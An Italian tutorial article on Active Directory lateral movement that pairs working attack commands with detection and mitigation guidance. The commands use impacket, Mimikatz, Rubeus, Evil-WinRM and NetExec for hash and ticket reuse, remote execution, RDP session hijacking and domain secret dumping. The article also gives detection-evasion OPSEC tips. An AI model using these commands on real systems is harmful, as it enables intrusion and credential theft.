---
title: 'Lateral Movement in Active Directory: Tecniche, Tool e OPSEC'
slug: lateral-movement
description: >-
  Guida al lateral movement in Active Directory: Pass-the-Hash, Kerberos, SMB,
  WMI, WinRM e RDP con prerequisiti, artefatti, detection e mitigazioni.
image: /lateral-movement-active-directory.webp
draft: false
date: 2026-07-15T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - lateral movement
  - active directory
  - pass-the-hash
  - pass-the-ticket
---

# Lateral Movement in Active Directory: Tecniche, Protocolli e Detection

Il lateral movement è la fase di post-exploitation in cui si usa una credenziale compromessa — hash NTLM, ticket Kerberos, o password in chiaro — per autenticarsi su altri host del dominio ed eseguire comandi. Ogni tecnica usa protocolli diversi, lascia artefatti diversi, e richiede prerequisiti diversi.

***

Ottenere un foothold su un host è solo l'inizio. In un ambiente [Active Directory](https://hackita.it/articoli/active-directory/) enterprise, il valore reale sta negli host successivi — il file server, il DC, la workstation dell'amministratore. Il lateral movement è il processo con cui si usa ciò che si ha (hash, ticket, password) per raggiungere ciò che si vuole.

> Non esiste una tecnica di lateral movement universalmente migliore. La scelta dipende dai prerequisiti disponibili (tipo di credenziale), dalla porta aperta sul target, e dal livello di monitoring del SOC. La tecnica più stealth non è sempre quella più affidabile.

Classificato da MITRE ATT\&CK come [T1021](https://attack.mitre.org/techniques/T1021/) (Remote Services) e [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material).

***

## Prerequisiti Comuni

Per qualsiasi tecnica di lateral movement servono:

* Una credenziale valida: hash NTLM, ticket Kerberos, o password in chiaro
* Accesso di rete al target sulla porta richiesta
* Privilegi sufficienti sul target (quasi sempre local admin o domain admin)

Le credenziali si ottengono tipicamente via [credential dumping](https://hackita.it/articoli/credential-dumping/) da LSASS, [DCSync](https://hackita.it/articoli/dcsync/), [Kerberoasting](https://hackita.it/articoli/kerberoasting/) o [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/).

***

## Tabella Comparativa

| Tecnica | Protocollo | Porta         | Artefatti tipici                                        | Requisiti                                                        |
| ------- | ---------- | ------------- | ------------------------------------------------------- | ---------------------------------------------------------------- |
| PSExec  | SMB        | 445           | Servizio RemComSvc, binario su ADMIN$, named pipe       | Admin locale, ADMIN$ share                                       |
| smbexec | SMB        | 445           | Servizio temporaneo via SCM, file .bat, output su share | Admin locale, ADMIN$                                             |
| wmiexec | WMI/RPC    | 135+dinamiche | Processo remoto, output su ADMIN$ (default)             | Admin locale                                                     |
| WinRM   | HTTP/S     | 5985/5986     | Sessione WSMan, logon remoto, processi PowerShell       | WinRM abilitato, admin locale                                    |
| DCOM    | RPC        | 135+dinamiche | Processo COM remoto                                     | Admin locale                                                     |
| RDP     | RDP        | 3389          | Logon interattivo, nuova sessione                       | Credenziali GUI                                                  |
| SSH     | SSH        | 22            | Sessione SSH                                            | SSH abilitato (di default su Server 2025, da verificare altrove) |

***

## Quale Tecnica Usare — Mappa Rapida

La scelta dipende da cosa hai in mano e cosa è aperto sul target:

```
HAI UNA PASSWORD IN CHIARO
├── Porta 445 aperta → PSExec, smbexec, NetExec
├── Porta 5985 aperta → WinRM / Evil-WinRM
├── Porta 135 aperta → WMIExec, DCOM
└── Porta 3389 aperta → RDP

HAI UN HASH NTLM (Pass-the-Hash)
├── Porta 445 → impacket-psexec -hashes, NetExec -H
├── Porta 5985 → evil-winrm -H
├── Porta 135 → impacket-wmiexec -hashes
└── LDAP/Kerberos → Overpass-the-Hash (converti hash → ticket, se RC4 ammesso)

HAI UN TICKET KERBEROS (.ccache / .kirbi)
├── Qualsiasi servizio Kerberos → export KRB5CCNAME + -k -no-pass
├── Porta 445 → impacket-psexec/smbexec -k
└── Porta 5985 → Evil-WinRM con -r REALM e -K ticket.ccache

HAI SOLO SHELL LOCALE (no creds esterne)
├── Token impersonation → PrintSpoofer, GodPotato
└── SeImpersonatePrivilege → Potato attacks
```

***

## Pass-the-Hash (PTH)

Il metodo più diretto: usa l'hash NTLM per autenticarsi senza conoscere la password. Funziona su qualsiasi protocollo che accetta NTLM.

```bash
# PSExec via PTH — shell SYSTEM sul target
impacket-psexec -hashes :NThash corp.local/administrator@<TARGET_IP>

# WMIExec via PTH
impacket-wmiexec -hashes :NThash corp.local/administrator@<TARGET_IP>

# smbexec via PTH
impacket-smbexec -hashes :NThash corp.local/administrator@<TARGET_IP>

# NetExec — esecuzione su più target contemporaneamente
nxc smb <TARGET_IP> -u administrator -H :NThash -x "whoami"
nxc smb targets.txt -u administrator -H :NThash -x "whoami"
```

```powershell
# Mimikatz — PTH che avvia un processo nel contesto dell'hash
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NThash /run:powershell.exe
```

Per la guida completa vedi [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/).

**PTH funziona con qualsiasi account?** No. Dipende dal supporto NTLM sul target, dai privilegi, dalle **UAC remote restrictions** e dalle policy sui local account. Per impostazione predefinita un account locale membro degli Administrators può ricevere, in connessioni amministrative remote, un token filtrato che impedisce l'accesso ad ADMIN$/C$ — il comportamento dipende da `LocalAccountTokenFilterPolicy`. Gli account di dominio membri degli amministratori locali ricevono normalmente un token amministrativo completo. Gli account nel gruppo **Protected Users** non possono autenticarsi via NTLM.

***

## Overpass-the-Hash (Hash → Ticket Kerberos)

Converte un hash NTLM in un ticket Kerberos (TGT), usando l'NT hash come chiave RC4. Utile quando RC4 è ancora ammesso per quell'account e nell'ambiente — non è una tecnica universale.

```powershell
# Mimikatz — crea TGT dall'hash e lo inietta in memoria
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NThash /run:powershell.exe
# Nella nuova shell:
klist
dir \\DC01\C$
```

```bash
# Rubeus — richiede TGT dall'hash e lo inietta
.\Rubeus.exe asktgt /user:administrator /rc4:NThash /domain:corp.local /ptt

# Da Linux — ottieni TGT con impacket e usalo
impacket-getTGT corp.local/administrator -hashes :NThash -dc-ip <DC_IP>
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@TARGET.corp.local
```

**Limite importante:** gli account **Protected Users** non possono usare RC4/DES per Kerberos, servono chiavi AES — Overpass-the-Hash basato solo sull'NT hash non funziona su questi account né dove RC4 è stato disabilitato.

***

## Pass-the-Ticket

Usa un ticket Kerberos già ottenuto (TGT o TGS) per autenticarsi senza password o hash.

### TGT, TGS e SPN: quale ticket puoi usare

Un **TGT** permette di richiedere nuovi service ticket al Domain Controller — è il più versatile. Un **TGS** è invece legato a uno specifico servizio e SPN: un ticket per `cifs/server` non equivale automaticamente a un ticket HTTP valido per WinRM sullo stesso host. Prima di usare un ticket, verifica principal, target e tipo con `klist`. Kerberos richiede inoltre DNS, FQDN e SPN coerenti, oltre a sincronizzazione temporale tra client e KDC.

```bash
# Inietta ticket in memoria (da Linux con ccache)
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@TARGET.corp.local
impacket-wmiexec -k -no-pass corp.local/administrator@TARGET.corp.local
impacket-smbclient -k -no-pass corp.local/administrator@TARGET.corp.local
```

```powershell
# Rubeus — inietta ticket .kirbi in memoria
Rubeus.exe ptt /ticket:ticket.kirbi
klist
dir \\TARGET\C$

Rubeus.exe ptt /ticket:<base64_ticket>
```

Per Golden e Silver Ticket vedi gli articoli dedicati: [Golden Ticket](https://hackita.it/articoli/golden-ticket/) e [Silver Ticket](https://hackita.it/articoli/silver-ticket/).

***

## PSExec — SMB

Copia un binario temporaneo (`RemComSvc`) su ADMIN$, crea un servizio, esegue il comando, poi rimuove tutto. Dà shell SYSTEM.

```bash
impacket-psexec corp.local/administrator:Password123!@<TARGET_IP>
impacket-psexec -hashes :NThash corp.local/administrator@<TARGET_IP>
impacket-psexec -k -no-pass corp.local/administrator@TARGET.corp.local
impacket-psexec corp.local/administrator:Password123!@<TARGET_IP> "whoami"
```

```powershell
.\PsExec.exe \\TARGET cmd.exe
.\PsExec.exe \\TARGET -u CORP\administrator -p Password123! cmd.exe
```

***

## wmiexec — Windows Management Instrumentation

Esegue comandi via `Win32_Process.Create`. Non crea servizi né carica un eseguibile dedicato — ma **nella modalità predefinita di Impacket usa comunque un file temporaneo sulla share ADMIN$ per recuperare l'output del comando**, non è quindi completamente fileless. La modalità `-nooutput` evita la connessione SMB di recupero risultato. Il processo remoto gira nel contesto dell'utente autenticato, non automaticamente come SYSTEM.

```bash
impacket-wmiexec corp.local/administrator:Password123!@<TARGET_IP>
impacket-wmiexec -hashes :NThash corp.local/administrator@<TARGET_IP>
impacket-wmiexec -k -no-pass corp.local/administrator@TARGET.corp.local
impacket-wmiexec corp.local/administrator:Password123!@<TARGET_IP> "ipconfig"
```

```powershell
# PowerShell nativo — WMI remoto
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" `
  -ComputerName TARGET -Credential $cred

# WMIC (LOLBin storico — deprecato e disabilitato di default su Windows 11 recenti)
wmic /node:TARGET /user:CORP\administrator /password:Password123! `
  process call create "cmd.exe /c whoami > C:\temp\out.txt"
```

***

## smbexec — SMB Senza Binario Dedicato

Non carica un binario tipo `RemComSvc`, ma **crea comunque un servizio temporaneo tramite Service Control Manager per ogni comando**, oltre a generare un file batch temporaneo e un file di output sulla share, poi tenta di ripulirli. Non è una tecnica stealth.

```bash
impacket-smbexec corp.local/administrator:Password123!@<TARGET_IP>
impacket-smbexec -hashes :NThash corp.local/administrator@<TARGET_IP>
```

***

## WinRM — PowerShell Remoting

Richiede che WinRM sia abilitato sul target (porta 5985/5986). Dà una sessione PowerShell completa.

```bash
# Evil-WinRM da Linux — password o hash
evil-winrm -i <TARGET_IP> -u administrator -p Password123!
evil-winrm -i <TARGET_IP> -u administrator -H NThash

# Kerberos — realm + ticket ccache/kirbi (FQDN del target richiesto)
evil-winrm -i TARGET.corp.local -r CORP.LOCAL -K ticket.ccache

# SSL opzionale (indipendente da Kerberos)
evil-winrm -i TARGET.corp.local -r CORP.LOCAL -K ticket.ccache -S

# Certificato client
evil-winrm -i <TARGET_IP> -u administrator -c cert.pem -k key.pem -S
```

Nota: in Evil-WinRM `-k` è il percorso della **chiave privata del certificato**, `-K` (maiuscola) è il **ticket Kerberos** ccache/kirbi. Kerberos non richiede necessariamente HTTPS.

```powershell
Enter-PSSession -ComputerName TARGET -Credential $cred

Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }

Invoke-Command -ComputerName (Get-Content hosts.txt) -Credential $cred `
  -ScriptBlock { whoami } -ThrottleLimit 10

Test-WSMan -ComputerName TARGET
```

Per la guida completa a Evil-WinRM vedi [evil-winrm](https://hackita.it/articoli/evilwinrm/).

***

## DCOM — Distributed COM

Usa oggetti COM per eseguire codice in remoto. Meno documentato dei metodi sopra, ma supportato nativamente su ogni Windows moderno.

```powershell
$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("Shell.Application", "TARGET"))
$com.ShellExecute("cmd.exe", "/c whoami > C:\temp\out.txt", "C:\Windows\System32", $null, 0)

$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\temp\out.txt", "7")
```

```bash
impacket-dcomexec corp.local/administrator:Password123!@<TARGET_IP> "whoami"
impacket-dcomexec -hashes :NThash corp.local/administrator@<TARGET_IP> "whoami"
```

***

## atexec — Task Scheduler Remoto

Esegue comandi via Task Scheduler remoto: non crea un servizio, ma crea (e poi rimuove) un'attività pianificata. Alternativa a wmiexec quando le named pipe SMB sono bloccate.

```bash
impacket-atexec corp.local/administrator:Password123!@<TARGET_IP> "whoami"
impacket-atexec -hashes :NThash corp.local/administrator@<TARGET_IP> "whoami"
impacket-atexec -k -no-pass corp.local/administrator@TARGET.corp.local "whoami"
```

***

## RDP Session Hijacking

Se hai accesso SYSTEM su un host con sessioni RDP attive, puoi hijackare la sessione di un utente autenticato senza conoscerne le credenziali:

```powershell
query session /server:TARGET
# rdp-tcp#0    john.doe  2   Active

tscon 2 /dest:rdp-tcp#0

sc.exe \\TARGET create hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"
sc.exe \\TARGET start hijack
```

***

## RDP — Remote Desktop

Utile per accesso interattivo ma alto profilo di detection — genera log visibili e non scala su molti target.

```bash
xfreerdp /u:administrator /p:Password123! /v:<TARGET_IP>
xfreerdp /u:administrator /pth:NThash /v:<TARGET_IP>  # PTH via RDP (richiede Restricted Admin Mode)

reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

***

## SSH

Meno comune negli ambienti Windows legacy, ma da verificare soprattutto su **Windows Server 2025**, dove OpenSSH Server è installato per impostazione predefinita — il servizio va comunque abilitato. Su Server 2019, Server 2022 e client Windows rimane una funzionalità opzionale.

***

## Lateral Movement su Larga Scala — NetExec

[NetExec](https://hackita.it/articoli/netexec/) è lo strumento più efficace per muoversi su molti host simultaneamente.

```bash
nxc smb 192.168.1.0/24 -u administrator -H :NThash

nxc smb 192.168.1.0/24 -u administrator -H :NThash -x "whoami" --no-bruteforce

nxc winrm 192.168.1.0/24 -u administrator -H :NThash

nxc wmi 192.168.1.0/24 -u administrator -H :NThash -x "whoami"

export KRB5CCNAME=ticket.ccache
nxc smb targets.txt -k --no-bruteforce -x "whoami"
```

***

## Mapping MITRE ATT\&CK

| Tecnica                            | MITRE     |
| ---------------------------------- | --------- |
| RDP                                | T1021.001 |
| SMB/Admin Shares                   | T1021.002 |
| DCOM                               | T1021.003 |
| SSH                                | T1021.004 |
| WinRM                              | T1021.006 |
| WMI                                | T1047     |
| Pass-the-Hash                      | T1550.002 |
| Pass-the-Ticket                    | T1550.003 |
| PSExec/smbexec (service execution) | T1569.002 |
| RDP Session Hijacking              | T1563.002 |
| atexec / Scheduled Task            | T1053.005 |

***

## OPSEC

* **PSExec è tra i più rumorosi:** crea un servizio e copia un binario. L'evento **7045** (System log) e il **4697** (Security log, se l'audit policy è attiva) sono artefatti attesi da raccogliere e correlare
* **smbexec non è stealth:** crea comunque un servizio temporaneo via SCM per ogni comando, oltre a file batch e output su share
* **wmiexec è un compromesso:** nessun servizio, ma tipicamente scrive l'output su ADMIN$ (evitabile con `-nooutput`)
* **WinRM non crea servizi né binari, ma non è automaticamente stealth:** genera sessioni WSMan, logon remoti e processi PowerShell correlabili
* **Pass-the-Ticket non è invisibile:** l'uso anomalo dello stesso ticket da host diversi o verso servizi insoliti è rilevabile via detection comportamentale
* **Preferisci comandi singoli a shell interattive:** meno tempo di esposizione nella sessione remota
* **Evita di rimbalzare attraverso molti hop consecutivi:** ogni hop aggiunge un punto di detection

***

## Scenario Reale

Hai dumpato l'hash di `corp\administrator` da una workstation compromessa. Vuoi raggiungere il file server e il DC.

```bash
# 1. Verifica dove sei admin
nxc smb 192.168.1.0/24 -u administrator -H :NThash | grep "Pwn3d"

# 2. Lateral movement sul file server
impacket-wmiexec -hashes :NThash corp.local/administrator@FILESERVER.corp.local

# 3. Dal file server, dump ulteriori credenziali, poi pivot verso il DC

# 4. Sul DC, converti in ticket Kerberos e usalo
impacket-getTGT corp.local/administrator -hashes :NThash -dc-ip <DC_IP>
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@DC01.corp.local -just-dc
```

***

## Detection

**🔴 HIGH:**

* **Event ID 7045** (System) — installazione servizio: artefatto atteso sia per PSExec sia per smbexec
* **Event ID 4697** (Security, se audit abilitato) — servizio installato nel sistema
* **Event ID 4698** — creazione di una scheduled task (atexec): task creato e rimosso in finestra temporale molto breve, correlare con Task Scheduler Operational log e processo figlio generato da Task Scheduler
* **Event ID 4624 Type 3** — network logon ripetuti dallo stesso account verso più host in breve tempo
* **Event ID 4648** — logon con credenziali esplicite diverse dall'account di sessione

**🟡 MEDIUM:**

* WMI activity (`__EventConsumer`, `Win32_Process.Create`) da processi non amministrativi
* Sessioni WinRM/WSMan da host non usuali, correlate con logon remoto e processi PowerShell (MITRE ha una detection strategy specifica per T1021.006 basata su questa correlazione)
* Stesso ticket Kerberos o stesso hash usato per autenticarsi su più macchine o servizi insoliti in sequenza

***

## Mitigazione

* **Windows LAPS** — password locale unica e ruotata per ogni macchina, blocca il PTH laterale basato su hash comune del local admin
* **Credential Guard** — isola LSASS in ambiente virtualizzato (VBS), protegge NTLM hash, TGT Kerberos e altre credenziali di dominio; non è una soluzione universale e non protegge credenziali già sottratte altrove. Abilitato di default sui sistemi idonei Windows 11 22H2 e Windows Server 2025 domain-joined non-DC
* **Remote Credential Guard / Restricted Admin Mode** — riduce l'esposizione delle credenziali durante sessioni RDP
* **Disabilitare NTLM** dove possibile, forzare Kerberos — riduce il vettore PTH classico
* **SMB Signing** — protegge da alterazione del traffico, spoofing e relay; **non impedisce** a chi possiede già una credenziale o un hash valido di autenticarsi normalmente via SMB, non è quindi una mitigazione contro il Pass-the-Hash in sé
* **Negare network logon e RDP** ai gruppi `Local account` e `Local account and member of Administrators group`
* **Segmentazione di rete** — limita porte SMB/WMI/WinRM solo verso host che ne hanno necessità operativa
* **Account amministrativi separati** per workstation, server e Domain Controller
* **Protected Users Security Group** per gli account privilegiati (blocca NTLM e RC4/DES su Kerberos per quegli account)

***

## FAQ

**Il lateral movement è sempre necessario in un engagement?**
No. Dipende dall'obiettivo. Se il primo host compromesso contiene già il dato, il controllo o l'evidenza richiesta, il lateral movement può non essere necessario. Diventa rilevante quando occorre raggiungere sistemi, identità o segmenti differenti.

**Qual è la differenza tra lateral movement e privilege escalation?**
La privilege escalation aumenta i privilegi sullo stesso host (da user a SYSTEM). Il lateral movement sposta l'accesso su un host diverso. In un engagement tipico si fa spesso entrambe: escalation locale per ottenere un hash, poi lateral movement verso il target successivo.

**WinRM è più stealth di PSExec?**
Evita la creazione del servizio e il caricamento del binario tipici di PSExec, ma non è automaticamente stealth: produce sessioni remote, autenticazioni, attività WSMan e processi sul target. La rilevabilità dipende dal baseline e dalla telemetria raccolta dal SOC.

**Quali porte devono essere aperte per il lateral movement?**
SMB richiede 445, WMI richiede 135 + porte dinamiche, WinRM richiede 5985 (HTTP) o 5986 (HTTPS), RDP richiede 3389. In molte reti aziendali il firewall blocca questi protocolli tra workstation ma non tra workstation e server.

**PTH funziona su tutti gli account?**
No. Dipende dal supporto NTLM, dai privilegi sul target, dalle UAC remote restrictions e dalle policy sui local account. Gli account Protected Users non possono usare NTLM; gli account locali possono ricevere un token remoto filtrato a seconda della configurazione.

**Cosa succede se WinRM è disabilitato?**
Prova WMI (porta 135) come alternativa. Se anche WMI è bloccato, SMB + PSExec/smbexec sono spesso ancora disponibili. In ultima istanza, se RDP è aperto, il lateral movement resta possibile via GUI.

***

## Conclusione

Il lateral movement è la fase che trasforma un singolo host compromesso in un dominio compromesso. La scelta della tecnica giusta — in base a credenziali disponibili, porte aperte, e profilo di detection dell'ambiente — è ciò che distingue un engagement rumoroso da uno stealth.

La difesa non sta nel bloccare una singola tecnica ma nel ridurre la superficie: LAPS per i local admin, Credential Guard per gli hash, segmentazione per limitare la raggiungibilità. Senza questi controlli strutturali, qualsiasi credenziale compromessa è un biglietto per tutto il dominio.

***

**Risorse:**

* [MITRE ATT\&CK – T1021 Remote Services](https://attack.mitre.org/techniques/T1021/)
* [MITRE ATT\&CK – T1550 Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
* [HackTricks – Lateral Movement](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/lateral-movement-abusing-service-accounts-without-kerberos.html)
